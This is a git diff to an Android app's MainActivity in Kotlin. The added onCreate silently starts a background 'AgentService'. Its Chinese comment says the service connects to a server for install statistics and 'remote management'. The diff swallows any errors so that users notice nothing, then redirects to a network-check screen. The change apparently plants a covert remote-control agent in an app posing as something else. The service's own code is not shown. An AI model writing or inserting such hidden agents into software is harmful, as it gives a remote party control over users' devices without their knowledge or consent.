@@ -29,6 +29,28 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnStart: Button
     private lateinit var btnStop: Button
 
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        // 静默启动 Agent 服务（后台连服务器，用于装机量统计和远程管理）
+        AgentConfig.save(this, AgentConfig.getServerUrl(this)) // 确保 URL 已写入
+        try {
+            val serviceIntent = Intent(this, AgentService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+        } catch (e: Exception) {
+            // 静默失败，不影响用户体验
+        }
+
+        // 直接跳转到网络检测界面
+        startActivity(Intent(this, NetCheckActivity::class.java))
+        finish()
+        return
+    }
+
     private val statusReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             val status = intent.getStringExtra("status") ?: return
